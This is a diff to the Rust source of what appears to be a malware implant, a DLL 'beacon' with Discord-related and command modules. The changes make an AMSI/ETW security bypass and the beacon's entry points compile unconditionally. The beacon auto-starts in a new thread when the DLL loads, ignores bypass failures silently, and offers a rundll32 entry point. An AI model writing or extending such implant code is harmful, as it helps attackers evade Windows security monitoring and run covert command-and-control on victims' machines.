@@ -14,13 +14,11 @@
 // conditionnellement selon la plateforme.
 #![allow(dead_code)]
 
+mod bypass;
 mod commands;
 mod config;
 mod discord;
 mod error;
-
-#[cfg(windows)]
-mod bypass;
 
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::Arc;
@@ -58,13 +56,10 @@ pub fn run_beacon() -> Result<()> {
     // Avoid println! in DLL - use OutputDebugString or similar in production
     // For now we keep them for debugging
 
-    #[cfg(windows)]
-    {
-        // Attempt security bypass (AMSI/ETW)
-        match bypass::setup_bypass() {
-            Ok(_) => {}   // Success - silently continue
-            Err(_e) => {} // Warning - continue anyway
-        }
+    // Attempt security bypass (AMSI/ETW)
+    match bypass::setup_bypass() {
+        Ok(_) => {}   // Success - silently continue
+        Err(_e) => {} // Warning - continue anyway
     }
 
     // Load embedded configuration
@@ -101,7 +96,6 @@ pub fn run_beacon() -> Result<()> {
 
 /// DllMain - Called when the DLL is loaded/unloaded
 /// AUTO-STARTS the beacon in a new thread on DLL_PROCESS_ATTACH
-#[cfg(windows)]
 #[no_mangle]
 pub extern "system" fn DllMain(
     _dll_module: *mut std::ffi::c_void,
@@ -133,19 +127,11 @@ pub extern "system" fn Start() {
 /// Alternative entry point with standard Windows calling convention
 /// Usage: rundll32.exe beacon.dll,Run  
 #[no_mangle]
-#[cfg(windows)]
 pub extern "system" fn Run(
     _hwnd: *mut std::ffi::c_void,
     _hinst: *mut std::ffi::c_void,
     _lpsz_cmd_line: *const i8,
     _n_cmd_show: i32,
 ) {
-    Start();
-}
-
-/// Stub for non-Windows compilation
-#[no_mangle]
-#[cfg(not(windows))]
-pub extern "C" fn Run() {
     Start();
 }
